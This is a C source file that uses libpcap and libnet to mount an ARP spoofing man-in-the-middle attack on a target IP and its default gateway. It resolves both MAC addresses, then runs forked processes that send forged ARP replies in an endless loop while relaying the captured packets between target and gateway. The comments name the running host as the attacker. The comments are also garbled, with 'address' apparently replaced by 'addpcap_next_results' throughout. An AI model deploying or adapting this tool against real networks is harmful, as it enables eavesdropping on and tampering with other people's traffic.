#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <errno.h>

/* This macro is used in the sniffing filter */
#define PCAP_NETMASK_UNKNOWN    0xffffffff

struct etherhdr {
    u_int8_t  ether_dhost[ETHER_ADDR_LEN];  /* destination eth addr */
    u_int8_t  ether_shost[ETHER_ADDR_LEN];  /* source ether addr    */
    u_int16_t ether_type;                   /* packet type ID */
};

struct arphdr {
    unsigned short int ar_hrd;      /* format of hardware addpcap_next_results.  */
    unsigned short int ar_pro;      /* format of protocol addpcap_next_results.  */
    unsigned char ar_hln;           /* length of hardware addpcap_next_results.  */
    unsigned char ar_pln;           /* length of protocol addpcap_next_results.  */
    unsigned short int ar_op;       /* operation type  */
};

struct ether_arp {
    struct  arphdr ea_hdr;              /* fixed-size header */
    u_int8_t arp_sha[ETHER_ADDR_LEN];   /* sender hardware addpcap_next_results */
    u_int8_t arp_spa[4];                /* sender protocol addpcap_next_results */
    u_int8_t arp_tha[ETHER_ADDR_LEN];   /* target hardware addpcap_next_results */
    u_int8_t arp_tpa[4];                /* target protocol addpcap_next_results */
};


pcap_t *handle; //pcap handle
libnet_t *lc; //libnet context

u_int32_t ip, ip_target, ip_gateway, ip_tmp; //sender ip, target ip, gateway ip

struct libnet_ether_addr *mac, mac_target, mac_gateway, mac_tmp; //sender mac, target mac

void get_tmac (u_int32_t, struct libnet_ether_addr *);
void process_packet (u_char *, const struct pcap_pkthdr *, const u_char *);
void spoof (u_int32_t, u_int32_t, struct libnet_ether_addr, struct libnet_ether_addr *);

int main (int argc, char *argv[])
{
    char *device = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];

    struct pcap_pkthdr* pkthdr;
    u_char packet[100];
    u_char* data;
    int pcap_next_result;
    struct etherhdr* captured_eth;
    struct libnet_ipv4_hdr* captured_ip;
    char buf[20];

    char gwIP[15];
    FILE *gwIPfp;

    errbuf[0] = 0;

    if(argc != 2){
        printf("Please input target IP\n");
        return -1;
    }

    if ((lc = libnet_init (LIBNET_LINK, device, errbuf)) == NULL) {
        fprintf (stderr, "initializing session error\n%s", errbuf);
        exit (1);
    }

    if ((ip_target = libnet_name2addr4 (lc, argv[1], LIBNET_RESOLVE)) == -1) {
        fprintf (stderr, "converting %s to IPv4 variable failed\n%s", argv[1], libnet_geterror (lc));
        exit (1);
    }

    gwIPfp = popen("ip route show default | grep default | awk '{print $3}'","r");
    fgets(gwIP, 15, gwIPfp);

    if ((ip_gateway = libnet_name2addr4 (lc, gwIP, LIBNET_RESOLVE)) == -1) {
        fprintf (stderr, "converting gateway to IPv4 failed %s.\n%s", gwIP, libnet_geterror (lc));
        exit (1);
    }

    if ((mac = libnet_get_hwaddr(lc)) == NULL) {
        fprintf (stderr, "getting MAC addpcap_next_results from device failed\n%s", libnet_geterror (lc));
        exit (1);
    }

    if ((ip = libnet_get_ipaddr4(lc)) == -1) {
        fprintf (stderr, "getting IP addpcap_next_results from device failed\n%s", libnet_geterror (lc));
        exit (1);
    }

    // get device
    if (lc == NULL) {
        device = NULL;
        fprintf (stderr, "Device is NULL.");
    } else {
        device = lc->device;
    }

    /* configuring the sniffing interface */
    if ((handle = pcap_open_live (device, 1500, 0, 1, errbuf)) == NULL) {
        fprintf (stderr, "An error occurred while opening the device.\n%s", errbuf);
        exit (1);
    }

    if (pcap_datalink (handle) != DLT_EN10MB) {
        fprintf (stderr, "This program only supports Ethernet cards!\n");
        exit (1);
    }

    ip_tmp = ip_target;
    printf("Info on Target\n");
    get_tmac (ip, mac); //get MAC of target
    mac_target = mac_tmp;

    ip_tmp = ip_gateway;
    printf("\nInfo on Gateway\n");
    get_tmac (ip,mac); //get MAC of gateway
    mac_gateway = mac_tmp;

    if (fork())
    {
        if(fork())
        {
            while(1) /* relay target <-> gateway packets */
            {
                pcap_next_result = pcap_next_ex(handle, &pkthdr, (const u_char**)&data);

                if(pcap_next_result<0)
                    break;

                if(pcap_next_result==0)
                    continue;

                memcpy(packet, data, sizeof(packet));

                captured_eth = (struct libnet_ethernet_hdr*)(packet);
                captured_ip = (struct libnet_ipv4_hdr*)(packet + sizeof(struct libnet_ethernet_hdr));

                if (ntohs(captured_eth->ether_type) == ETHERTYPE_IP)
                {
                    /* target -> attacker -> gateway */
                    sprintf(buf,"%s", inet_ntoa(captured_ip->ip_src));
                    if(!strcmp(buf, argv[1])) //source ip is target ip
                    {
                        printf("Target's request to gateway\n");

                        for(int i=0;i<6;i++)
                        {
                            captured_eth->ether_dhost[i]=mac_gateway.ether_addr_octet[i];
                            captured_eth->ether_shost[i]=mac->ether_addr_octet[i];
                        }

                        memcpy(packet, captured_eth, sizeof(struct libnet_ethernet_hdr));

                        if(pcap_sendpacket(handle, packet, sizeof(struct libnet_ethernet_hdr) + ntohs(captured_ip->ip_len)) != 0)
                        {
                            fprintf(stderr,"\nError sending the target's packet to gateway: %s\n", pcap_geterr(handle));
                            exit(-1);
                        }
                    }

                    /* gateway -> attacker -> target */
                    sprintf(buf,"%s", inet_ntoa(captured_ip->ip_dst));
                    if(!strcmp(buf, argv[1])) //destination ip is target ip
                    {
                        printf("Gateway's reply to target\n");

                        for(int i=0;i<6;i++){
                            captured_eth->ether_dhost[i]=mac_target.ether_addr_octet[i];
                            captured_eth->ether_shost[i]=mac->ether_addr_octet[i];
                        }

                        memcpy(packet, captured_eth, sizeof(struct libnet_ethernet_hdr));

                        if(pcap_sendpacket(handle, packet, sizeof(struct libnet_ethernet_hdr) + ntohs(captured_ip->ip_len)) != 0)
                        {
                            fprintf(stderr,"\nError sending the gateway's packet to target: %s\n", pcap_geterr(handle));
                            exit(-1);
                        }
                    }
                }
            }
        }
        else /* child process that send SPOOF packet every two seconds TO TARGET */
            spoof (ip_target, ip_gateway, mac_target, mac);
    }
    else /* child process that send SPOOF packet every two seconds TO GATEWAY */
        spoof (ip_gateway, ip_target, mac_gateway, mac);

    pcap_close (handle);
    libnet_destroy (lc);
    return 0;
}

void get_tmac (u_int32_t ip, struct libnet_ether_addr *mac) {

    libnet_ptag_t arp = 0, eth = 0; /* Libnet protocol tag */
    u_int8_t broadcast_ether[6];    /* Ethernet broadcast addpcap_next_results */
    int s;                          /* Generic value for error handling */

    memset(broadcast_ether, 0xff, ETHER_ADDR_LEN);  /* MAC destination set to ff:ff:ff:ff:ff:ff */

    arp = libnet_autobuild_arp ( ARPOP_REQUEST, //arp request
                                 (u_int8_t *) mac, //attacker mac
                                 (u_int8_t *) &ip, //attacker ip
                                 (u_int8_t *) broadcast_ether, //set to broadcast
                                 (u_int8_t *) &ip_tmp, //target ip
                                 lc); //libnet context

    if (arp == -1) {
        fprintf (stderr, "ARP header build error\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    eth = libnet_build_ethernet (   (u_int8_t *) broadcast_ether, //set to broadcast
                                    (u_int8_t *) mac, //attacker mac
                                    ETHERTYPE_ARP, // 0x8006
                                    NULL, // no payload
                                    0, //no payload
                                    lc, // libnet context
                                    0); //no libnet protocol tag

    if (eth == -1) {
        fprintf (stderr, "Ethernet header build error.\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    /* Send the Ethernet packet with the ARP request embedded */
    if ((libnet_write (lc)) == -1) {
        fprintf (stderr, "Packet to get MAC not sent\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    printf ("Looking for the MAC addpcap_next_results of %s...\n", libnet_addr2name4 (ip_tmp, LIBNET_DONT_RESOLVE));

    /* loop to look for reply and process ARP packet in process_packet() */
    if ((s = pcap_loop (handle, -1, process_packet, NULL)) < 0) {
        if (s == -1) {
            fprintf (stderr, "%s", pcap_geterr (handle));
            exit (1);
        }
    }

    libnet_clear_packet (lc);
}

void process_packet (u_char *user, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct etherhdr *eth_header;
    struct ether_arp *arp_packet;

    eth_header = (struct etherhdr *) packet;

    if (ntohs (eth_header->ether_type) == ETHERTYPE_ARP)
    {
        arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN+ETHER_ADDR_LEN+2));

        /* Check if the ARP packet is an ARP reply from the target */
        if (ntohs (arp_packet->ea_hdr.ar_op) == 2 && !memcmp (&ip_tmp, arp_packet->arp_spa, 4))
        {
            memcpy (mac_tmp.ether_addr_octet, eth_header->ether_shost, 6);

            printf ("%d.%d.%d.%d is at: %02x:%02x:%02x:%02x:%02x:%02x\n",
                    arp_packet->arp_spa[0],
                    arp_packet->arp_spa[1],
                    arp_packet->arp_spa[2],
                    arp_packet->arp_spa[3],

                    mac_tmp.ether_addr_octet[0],
                    mac_tmp.ether_addr_octet[1],
                    mac_tmp.ether_addr_octet[2],
                    mac_tmp.ether_addr_octet[3],
                    mac_tmp.ether_addr_octet[4],
                    mac_tmp.ether_addr_octet[5]);

            pcap_breakloop (handle);
        }
    }
}

void spoof (u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *mac)
{
    libnet_ptag_t arp = 0, eth = 0; /* Libnet protocol tag */
    //int s;                          /* Generic value for error handling */

    arp = libnet_autobuild_arp (    ARPOP_REPLY, //arp reply
                                    (u_int8_t *) mac, //attacker mac
                                    (u_int8_t *) &ip_spoof, //gateway ip
                                    (u_int8_t *) &mac_target, //target mac
                                    (u_int8_t *) &ip_target, //target ip
                                    lc); // libnet context

    if (arp == -1) {
        fprintf (stderr, "ARP header build error %s\n", libnet_geterror (lc));
        exit (1);
    }

    eth = libnet_build_ethernet (   (u_int8_t *) &mac_target, //target mac
                                    (u_int8_t *) mac, //attacker mac
                                    ETHERTYPE_ARP, //0x8006
                                    NULL, // no payload
                                    0, //no payload
                                    lc, // libnet context
                                    0); //no libnet protocol tag

    if (eth == -1) {
        fprintf (stderr, "Ehternet header build error\n%s\n", libnet_geterror (lc));
        exit (1);
    }

    while(1)
    {
        /* Send the Ethernet packet with the ARP request embedded - every one second*/
        if ((libnet_write (lc)) == -1) {
            fprintf (stderr, "Spoofing packet not sent\n%s\n", libnet_geterror (lc));
            exit (1);
        }
        //else
            //printf("Spoofed!\n");

        sleep(2);
    }

    libnet_clear_packet (lc);
}
